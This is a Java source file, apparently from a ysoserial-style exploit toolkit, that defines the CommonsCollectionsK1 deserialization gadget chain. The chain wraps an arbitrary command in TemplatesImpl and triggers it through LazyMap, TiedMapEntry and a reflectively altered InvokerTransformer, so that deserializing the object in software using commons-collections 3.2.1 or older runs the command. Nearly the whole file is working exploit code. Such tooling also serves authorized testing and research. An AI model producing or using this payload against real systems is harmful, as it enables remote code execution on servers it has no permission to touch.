package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;

import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({"KORLR"})
public class CommonsCollectionsK1 implements CommandObjectPayload<Map>
{

	public Map getObject(String command) throws Exception {
		Object                  templates   = Gadgets.createTemplates4Cmd(command);
		InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		HashMap<String, String> innerMap    = new HashMap<String, String>();
		Map                     m           = LazyMap.decorate(innerMap, (Transformer) transformer);
		Map<Object, Object>     outerMap    = new HashMap<Object, Object>();
		TiedMapEntry            tied        = new TiedMapEntry(m, templates);
		outerMap.put(tied, "t");
		innerMap.clear();
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		return outerMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsK1.class, args);
	}
}
